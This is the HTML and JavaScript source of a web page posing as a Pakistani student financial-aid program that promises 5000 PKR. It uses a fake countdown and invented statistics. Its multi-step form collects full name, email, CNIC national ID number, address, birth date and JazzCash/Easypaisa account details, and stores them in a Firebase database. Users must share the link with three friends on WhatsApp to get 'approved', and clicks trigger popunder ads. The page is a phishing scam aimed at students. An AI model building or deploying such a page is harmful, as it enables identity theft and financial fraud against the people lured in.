<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Student Program</title>
    
    <!-- SEO and Link Preview Meta Tags (Updated Image) -->
    <meta name="description" content="Get financial assistance by applying to the Student Program. Click the link to find out more and apply.">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Student Program - Apply Now!">
    <meta property="og:description" content="Get financial assistance by applying to the Student Program. Click the link to find out more and apply.">
    <meta property="og:image" content="https://i.ibb.co/GfVnVdBh/Picsart-25-07-26-19-15-23-404.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Student Program - Apply Now!">
    <meta name="twitter:description" content="Get financial assistance by applying to the Student Program. Click the link to find out more and apply.">
    <meta name="twitter:image" content="https://i.ibb.co/GfVnVdBh/Picsart-25-07-26-19-15-23-404.jpg">

    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu:wght@700&family=Poppins:wght@700;900&display=swap" rel="stylesheet">
    
    <!-- Confetti Animation Library -->
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>

    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: { 'brand-green': '#016D3B', 'brand-dark-green': '#0F3D23', 'brand-light-green': '#A7D7B9', 'brand-blue': '#2563EB'},
                    fontFamily: { 'sans': ['Poppins', 'sans-serif'], 'urdu': ['Noto Nastaliq Urdu', 'sans-serif'] }
                }
            }
        }
    </script>
    
    <style>
        body { background-color: #F8F9FA; font-family: 'Poppins', 'urdu'; }
        .page-section, .application-step, .modal-overlay { display: none; }
        .page-section.active, .modal-overlay.active { display: flex; }
        .application-step.active { display: block; }
        .modal-overlay { position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.6); align-items: center; justify-content: center; padding: 1rem; }
        .font-urdu { line-height: 2; }
        .modal-content { max-height: 90vh; overflow-y: auto; }
    </style>
</head>

<body class="bg-gray-100">

    <!-- =========== FIXED HEADER =========== -->
    <header id="fixed-header" class="fixed top-0 left-0 right-0 z-50 shadow-md bg-white">
        <div class="container mx-auto flex items-center justify-between p-3 text-brand-dark-green">
            <img src="https://i.ibb.co/Fbd1mrDG/Picsart-25-07-26-14-19-53-354.png" alt="Logo" class="h-10">
            <div class="text-center">
                <h1 class="text-lg font-bold font-sans">Student Program</h1>
                <p class="text-sm font-urdu -mt-2">اسٹوڈنٹ پروگرام</p>
            </div>
            <img id="header-image" src="https://i.ibb.co/JR5v0nC0/Picsart-25-07-26-14-21-44-923.png" alt="Leader" class="w-12 h-12 rounded-full border-2 border-brand-green">
        </div>
    </header>

    <!-- =========== MAIN CONTENT AREA =========== -->
    <main class="pt-24 px-4 pb-8">
        <section id="home-page" class="page-section active flex-col items-center">
             <div id="main-status-message" class="text-center p-4">
                <h2 class="text-4xl font-black font-sans text-brand-dark-green">Apply Now!</h2>
                <p class="text-xl font-bold font-urdu text-gray-700 mt-1">اپنے وظیفے کے لیے درخواست دیں۔</p>
            </div>
            
            <div class="max-w-md mx-auto w-full bg-white text-center rounded-2xl p-6 shadow-lg border">
                <h3 class="text-3xl font-bold font-sans text-brand-dark-green">Congratulations!</h3>
                <p class="font-urdu text-lg text-brand-dark-green -mt-1 mb-2">مبارک ہو!</p>
                <p class="text-5xl font-black text-brand-green mb-2">5000 PKR</p>
                <p class="text-base text-gray-500 font-sans">Time remaining to claim</p>
                <p class="font-urdu text-sm text-gray-500 -mt-2">آفر ختم ہونے میں باقی وقت</p>
                <p id="countdown-timer" class="text-4xl font-black text-red-600 my-2">--:--:--</p>
                <div id="status-display" class="my-2">
                    <!-- Status from Firebase will be shown here -->
                </div>
                <div id="action-button-container">
                    <button id="claim-now-btn" class="mt-4 w-full bg-brand-green text-white rounded-xl py-3 shadow-md transition-transform transform hover:scale-105">
                        <span class="text-2xl font-bold font-sans">Claim Now</span>
                        <span class="block text-lg font-urdu -mt-2">ابھی رقم حاصل کریں</span>
                    </button>
                    <a id="check-status-btn" class="whatsapp-share-link hidden mt-4 w-full bg-brand-blue text-white rounded-lg py-3 font-bold text-xl hover:bg-blue-700 text-center block">Share on WhatsApp</a>
                    <button id="reset-application-btn" class="hidden mt-3 text-sm text-gray-500 hover:underline">Start a New Application</button>
                </div>
            </div>

             <div class="max-w-md mx-auto w-full space-y-6 mt-6">
                <div class="bg-white rounded-xl p-6 shadow-lg border text-center">
                    <h3 class="text-2xl font-bold font-sans text-brand-dark-green mb-2">Program Details</h3>
                    <p class="font-urdu text-xl text-brand-dark-green">پروگرام کی تفصیلات</p>
                     <div class="text-center mt-4"><button id="read-more-btn" class="text-brand-green font-bold">Read More &rarr;</button></div>
                </div>

                <!-- Adsterra Native Banner Start -->
                <div class="bg-white rounded-xl p-6 shadow-lg border text-center">
                    <script async="async" data-cfasync="false" src="//pl27096943.profitableratecpm.com/2c05fd49cb501befe8e1bf317d40ee5b/invoke.js"></script>
                    <div id="container-2c05fd49cb501befe8e1bf317d40ee5b"></div>
                </div>
                <!-- Adsterra Native Banner End -->

                <div class="bg-white rounded-xl p-6 shadow-lg border text-center">
                    <h3 class="text-2xl font-bold font-sans text-center text-brand-dark-green mb-4">Nationwide Impact</h3>
                    <div class="grid grid-cols-3 gap-4 text-center">
                        <div><p class="font-bold text-lg text-brand-green">10,000+</p><p class="text-xs font-sans">Registered</p></div>
                        <div><p class="font-bold text-lg text-brand-green">80,000+</p><p class="text-xs font-sans">Pending</p></div>
                        <div><p class="font-bold text-lg text-brand-green">10.2 Bn</p><p class="text-xs font-sans">Total Fund</p></div>
                    </div>
                    <!-- Main Program Image Updated -->
                    <img src="https://i.ibb.co/GfVnVdBh/Picsart-25-07-26-19-15-23-404.jpg" alt="Student Program Banner" class="w-full h-auto max-w-sm mx-auto mt-4 rounded-lg">
                </div>
                 
                <!-- Adsterra Banner Ad Start -->
                 <div class="text-center mx-auto">
                    <script type="text/javascript">
                        atOptions = {
                            'key' : '34daa95d37aa866e4d5dc188a89f19b2',
                            'format' : 'iframe',
                            'height' : 50,
                            'width' : 320,
                            'params' : {}
                        };
                    </script>
                    <script type="text/javascript" src="//www.highperformanceformat.com/34daa95d37aa866e4d5dc188a89f19b2/invoke.js"></script>
                 </div>
                <!-- Adsterra Banner Ad End -->
            </div>
        </section>
    </main>

    <!-- =========== APPLICATION MODAL =========== -->
    <div id="application-modal" class="modal-overlay">
        <div class="bg-white w-full max-w-md rounded-2xl shadow-xl relative modal-content">
            <canvas id="confetti-canvas" class="absolute top-0 left-0 w-full h-full pointer-events-none z-10"></canvas>
            <button id="close-modal-btn" class="absolute top-3 right-4 text-3xl text-gray-400 hover:text-gray-600 z-30">&times;</button>
            <div id="form-container" class="relative z-20 p-6 sm:p-8">
                
                <form id="step-1" class="application-step">
                    <h3 class="text-lg font-bold font-sans text-center mb-4">Step 1: Basic Info</h3>
                    <div class="space-y-4"><div><label class="block text-left text-sm font-sans">Full Name</label><input id="name-input" type="text" class="bg-gray-100 w-full p-3 rounded-lg mt-1" required></div><div><label class="block text-left text-sm font-sans">Email Address</label><input id="email-input" type="email" class="bg-gray-100 w-full p-3 rounded-lg mt-1" required></div></div>
                    <div class="mt-6 text-right"><button type="button" onclick="showStep('step-2')" class="bg-brand-green text-white font-bold py-2 px-8 rounded-lg">Next</button></div>
                </form>

                <form id="step-2" class="application-step">
                    <h3 class="text-lg font-bold font-sans text-center mb-4">Step 2: Personal Details</h3>
                    <div class="space-y-4"><div><label class="block text-left text-sm font-sans">CNIC (Without dashes)</label><input id="cnic-input" type="number" class="bg-gray-100 w-full p-3 rounded-lg mt-1" required></div><div><label class="block text-left text-sm font-sans">Address</label><input id="address-input" type="text" class="bg-gray-100 w-full p-3 rounded-lg mt-1" required></div><div><label class="block text-left text-sm font-sans">Date of Birth</label><input id="dob-input" type="date" class="bg-gray-100 w-full p-3 rounded-lg mt-1" required></div></div>
                    <div class="mt-6 flex justify-between"><button type="button" onclick="showStep('step-1')" class="bg-gray-500 text-white font-bold py-2 px-6 rounded-lg">Back</button><button type="button" onclick="showStep('step-3')" class="bg-brand-green text-white font-bold py-2 px-8 rounded-lg">Next</button></div>
                </form>
                
                <form id="step-3" class="application-step">
                     <h3 class="text-lg font-bold font-sans text-center mb-4">Step 3: Education</h3>
                     <div class="space-y-4"><div><label class="block text-left text-sm font-sans">Institution Name</label><input id="institution-input" type="text" class="bg-gray-100 w-full p-3 rounded-lg mt-1" required></div><div><label class="block text-left text-sm font-sans">Education Level</label><select id="level-input" class="bg-gray-100 w-full p-3 rounded-lg font-urdu mt-1" required><option>میٹرک</option><option>ایف اے/ایف ایس سی</option><option>بی اے/بی ایس سی</option><option>ماسٹرز</option></select></div><div class="flex items-center space-x-4 pt-2"><label class="text-sm flex items-center gap-2"><input type="radio" name="status" value="studying" checked class="w-4 h-4">Currently Studying</label><label class="text-sm flex items-center gap-2"><input type="radio" name="status" value="working" class="w-4 h-4">Currently Working</label></div></div>
                     <div class="mt-6 flex justify-between"><button type="button" onclick="showStep('step-2')" class="bg-gray-500 text-white font-bold py-2 px-6 rounded-lg">Back</button><button type="button" onclick="showStep('step-4')" class="bg-brand-green text-white font-bold py-2 px-8 rounded-lg">Next</button></div>
                </form>

                <form id="step-4" class="application-step">
                     <h3 class="text-lg font-bold font-sans text-center mb-4">Step 4: Payment Details</h3>
                     <div class="space-y-4"><div><label class="block text-left text-sm font-sans">Payment Method</label><select id="method-input" class="bg-gray-100 w-full p-3 rounded-lg mt-1" required><option>JazzCash</option><option>Easypaisa</option></select></div><div><label class="block text-left text-sm font-sans">Account Holder Name</label><input id="account-name-input" type="text" class="bg-gray-100 w-full p-3 rounded-lg mt-1" required></div><div><label class="block text-left text-sm font-sans">Account Number</label><input id="account-number-input" type="number" class="bg-gray-100 w-full p-3 rounded-lg mt-1" required></div></div>
                     <div class="mt-6 flex justify-between"><button type="button" onclick="showStep('step-3')" class="bg-gray-500 text-white font-bold py-2 px-6 rounded-lg">Back</button><button type="button" onclick="submitApplication()" class="bg-blue-600 text-white font-bold py-2 px-8 rounded-lg">Submit</button></div>
                </form>
                
                 <div id="step-5" class="application-step text-center">
                    <h3 class="text-xl font-bold font-sans text-red-600">Final Step!</h3>
                    <p class="text-lg font-bold font-urdu text-red-600 -mt-1">آخری مرحلہ!</p>
                    <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-800 p-3 my-4 text-left" role="alert">
                        <p class="font-bold font-sans">Status: <span class="font-normal">Pending</span></p>
                    </div>
                    <div class="space-y-4">
                        <p class="font-sans text-gray-800 text-sm">To get your status approved, you must share this with 3 friends on WhatsApp.</p>
                        <hr>
                        <p class="font-urdu text-gray-800 text-base">اپنا اسٹیٹس منظور کروانے کے لیے، اس پیغام کو 3 دوستوں کے ساتھ واٹس ایپ پر شیئر کریں۔</p>
                    </div>
                    <div class="mt-4 flex flex-col items-center gap-2">
                        <a class="whatsapp-share-link w-full bg-green-500 text-white rounded-lg py-3 flex items-center justify-center gap-2">
                            <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.894 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.886-.001 2.269.655 4.383 1.905 6.166l-1.138 4.162 4.273-1.122z"/></svg>
                            <span class="text-lg font-bold font-sans">Share on WhatsApp</span>
                        </a>
                    </div>
                 </div>
            </div>
        </div>
    </div>
    
    <!-- =========== PROGRAM DETAILS MODAL =========== -->
    <div id="details-modal" class="modal-overlay">
        <div class="bg-white w-full max-w-2xl rounded-lg shadow-xl modal-content">
            <div class="flex justify-between items-center p-4 border-b">
                <h3 class="text-xl font-semibold text-gray-800 font-sans">Program Details</h3>
                <button id="close-details-modal-btn" class="text-3xl text-gray-400 hover:text-gray-600">&times;</button>
            </div>
            <div id="details-modal-body" class="p-6 space-y-4 text-left">
                <p>Loading details...</p>
            </div>
        </div>
    </div>

    <!-- Adsterra Popunder & Social Bar -->
    <script type='text/javascript' src='//pl27018207.profitableratecpm.com/8b/f2/55/8bf25512ef49a76e4a8b615a78242284.js'></script>
    <script type='text/javascript' src='//pl26479822.profitableratecpm.com/11/f3/83/11f3830187c378aedebef88b0bcd83a0.js'></script>

    <!-- Firebase SDK -->
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
      import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";
      const firebaseConfig = { apiKey: "AIzaSyBdm5Ot1bjCq6Ytrul9L2UQo61oSmSeaa0", authDomain: "student-program-e6ed4.firebaseapp.com", databaseURL: "https://student-program-e6ed4-default-rtdb.firebaseio.com", projectId: "student-program-e6ed4", storageBucket: "student-program-e6ed4.appspot.com", messagingSenderId: "466600750135", appId: "1:466600750135:web:a5f034144278156ef0a3b2" };
      const app = initializeApp(firebaseConfig);
      const database = getDatabase(app);
      
      window.db = {
          saveToFirebase: (data) => push(ref(database, 'applications'), data),
          getProgramDetails: (callback) => onValue(ref(database, 'programDetails'), callback),
          getApplicationStatus: (appId, callback) => onValue(ref(database, `applications/${appId}`), callback)
      };
    </script>

    <!-- Main Page Script -->
    <script>
        const appModal = document.getElementById('application-modal');
        const detailsModal = document.getElementById('details-modal');
        const claimBtn = document.getElementById('claim-now-btn');
        const closeBtn = document.getElementById('close-modal-btn');
        const checkStatusBtn = document.getElementById('check-status-btn');
        const resetBtn = document.getElementById('reset-application-btn');
        const readMoreBtn = document.getElementById('read-more-btn');
        const closeDetailsModalBtn = document.getElementById('close-details-modal-btn');
        const mainStatusMessage = document.getElementById('main-status-message');
        const statusDisplay = document.getElementById('status-display');
        const countdownEl = document.getElementById('countdown-timer');
        const adDirectLink = 'https://www.profitableratecpm.com/zi30dfhjnn?key=b78830ea0cb80a28c4b278ee2e122b06';

        function openAdLink() {
            window.open(adDirectLink, '_blank');
        }

        function launchConfetti() {
            const canvas = document.getElementById('confetti-canvas');
            if (!canvas) return;
            const myConfetti = confetti.create(canvas, { resize: true, useWorker: true });
            myConfetti({ particleCount: 200, spread: 120, origin: { y: 0.6 } });
        }

        function showAppModal() {
            openAdLink(); 
            appModal.classList.add('active');
            showStep('step-1');
            launchConfetti();
        }
        
        claimBtn.onclick = () => showAppModal();
        closeBtn.onclick = () => appModal.classList.remove('active');
        readMoreBtn.onclick = () => detailsModal.classList.add('active');
        closeDetailsModalBtn.onclick = () => detailsModal.classList.remove('active');
        
        resetBtn.onclick = () => {
            if (confirm("Are you sure you want to start over? Your previous application status will be lost.")) {
                localStorage.removeItem('userApplicationId');
                document.getElementById('application-modal').querySelectorAll('input, select').forEach(el => el.value = '');
                updateHomePageUI();
            }
        }

        function showStep(stepId) {
            document.querySelectorAll('.application-step').forEach(s => s.classList.remove('active'));
            document.getElementById(stepId)?.classList.add('active');
        }

        async function submitApplication() {
            if (!document.getElementById('account-name-input').value || !document.getElementById('account-number-input').value) {
                alert('Please fill out all payment details.');
                return;
            }
            
            openAdLink();

            const formData = {
                fullName: document.getElementById('name-input').value, email: document.getElementById('email-input').value, cnic: document.getElementById('cnic-input').value, address: document.getElementById('address-input').value, dob: document.getElementById('dob-input').value, institution: document.getElementById('institution-input').value, educationLevel: document.getElementById('level-input').value, currentStatus: document.querySelector('input[name="status"]:checked').value, paymentMethod: document.getElementById('method-input').value, accountName: document.getElementById('account-name-input').value, accountNumber: document.getElementById('account-number-input').value, submissionTime: new Date().toISOString(), status: 'Pending'
            };

            if (window.db?.saveToFirebase) {
                try {
                    const newRef = await window.db.saveToFirebase(formData);
                    localStorage.setItem('userApplicationId', newRef.key);
                    updateHomePageUI(formData); 
                    showStep('step-5'); 
                } catch(e) {
                    alert('Failed to submit application. Please try again.');
                    console.error(e);
                }
            }
        }
        
        function setWhatsAppLinks() {
            const text = encodeURIComponent("I have applied for the Student Program. You can also apply for financial help. Check it out: " + window.location.href);
            document.querySelectorAll('.whatsapp-share-link').forEach(link => {
                link.href = `https://api.whatsapp.com/send?text=${text}`;
                link.target = "_blank";
            });
        }

        function updateHomePageUI(appData = null) {
            const appId = localStorage.getItem('userApplicationId');
            
            if (appId) {
                claimBtn.style.display = 'none';
                checkStatusBtn.style.display = 'block';
                resetBtn.style.display = 'block';

                if (appData?.status) {
                     let statusText, statusColor;
                     mainStatusMessage.innerHTML = '';

                    if (appData.status === 'Approved') {
                        mainStatusMessage.innerHTML = `<h2 class="text-4xl font-black font-sans text-brand-green">Application Approved!</h2><p class="text-xl font-bold font-urdu text-gray-700 mt-1">آپ کا وظیفہ منظور ہو گیا ہے۔</p>`;
                        statusText = 'Approved'; statusColor = 'text-green-600'; launchConfetti();
                    } else if (appData.status === 'Rejected') {
                        mainStatusMessage.innerHTML = `<h2 class="text-4xl font-black font-sans text-red-600">Application Status</h2><p class="text-xl font-bold font-urdu text-gray-700 mt-1">آپ کی درخواست مسترد کر دی گئی ہے۔</p>`;
                        statusText = 'Rejected'; statusColor = 'text-red-600';
                    } else {
                        mainStatusMessage.innerHTML = `<h2 class="text-4xl font-black font-sans text-brand-dark-green">Application Submitted</h2><p class="text-xl font-bold font-urdu text-gray-700 mt-1">آپ کی درخواست زیرِ غور ہے۔</p>`;
                        statusText = 'Pending Review'; statusColor = 'text-yellow-600';
                    }
                    statusDisplay.innerHTML = `<p class="font-sans">Status: <span class="font-bold ${statusColor}">${statusText}</span></p>`;
                } else {
                     statusDisplay.innerHTML = `<p class="font-sans">Your status will be updated here.</p>`;
                     checkUserStatusOnLoad(appId);
                }
            } else {
                claimBtn.style.display = 'block'; checkStatusBtn.style.display = 'none'; resetBtn.style.display = 'none';
                mainStatusMessage.innerHTML = `<h2 class="text-4xl font-black font-sans text-brand-dark-green">Apply Now!</h2><p class="text-xl font-bold font-urdu text-gray-700 mt-1">اپنے وظیفے کے لیے درخواست دیں۔</p>`;
                statusDisplay.innerHTML = '';
            }
        }
        
        function checkUserStatusOnLoad(appId) {
            if (appId && window.db?.getApplicationStatus) {
                window.db.getApplicationStatus(appId, (snapshot) => {
                    const appData = snapshot.val();
                    if (appData) updateHomePageUI(appData);
                    else { localStorage.removeItem('userApplicationId'); updateHomePageUI(); }
                });
            }
        }
        
        function fetchProgramDetails() {
            if (window.db?.getProgramDetails) {
                window.db.getProgramDetails((snapshot) => {
                    const data = snapshot.val();
                    const body = document.getElementById('details-modal-body');
                    if (data) {
                        const eligibilityList = data.eligibility ? data.eligibility.split('\n').map(item => `<li>${item}</li>`).join('') : '';
                        body.innerHTML = `<div class="mb-4"><h4 class="font-bold text-lg font-sans text-brand-dark-green">1. Introduction</h4><p class="mt-1 text-gray-700 font-urdu">${data.introduction || 'N/A'}</p></div><div class="mb-4"><h4 class="font-bold text-lg font-sans text-brand-dark-green">2. Eligibility Criteria</h4><ul class="list-disc list-inside mt-1 text-gray-700 font-urdu">${eligibilityList || '<li>N/A</li>'}</ul></div><div class="mb-4"><h4 class="font-bold text-lg font-sans text-brand-dark-green">3. Payment & Deadline</h4><p class="mt-1 text-gray-700 font-urdu">${data.payment || 'N/A'}</p></div><div class="mb-4"><h4 class="font-bold text-lg font-sans text-brand-dark-green">4. Program Rules</h4><p class="mt-1 text-gray-700 font-urdu">${data.rules || 'N/A'}</p></div>`;
                    } else { body.innerHTML = '<p>Details are not available right now.</p>'; }
                });
            }
        }
        
        function startCountdown() {
            let days = 3, hours = 23, minutes = 7;
            setInterval(() => {
                minutes--;
                if (minutes < 0) { minutes = 59; hours--; }
                if (hours < 0) { hours = 23; days--; }
                if (days < 0) { days = 3; }
                countdownEl.textContent = `${days}d ${hours}h ${minutes}m`;
            }, 60000);
            countdownEl.textContent = `${days}d ${hours}h ${minutes}m`;
        }

        document.addEventListener('DOMContentLoaded', () => {
            const appId = localStorage.getItem('userApplicationId');
            updateHomePageUI(); 
            if (appId) checkUserStatusOnLoad(appId);
            fetchProgramDetails();
            setWhatsAppLinks();
            startCountdown();
        });
    </script>
</body>
</html>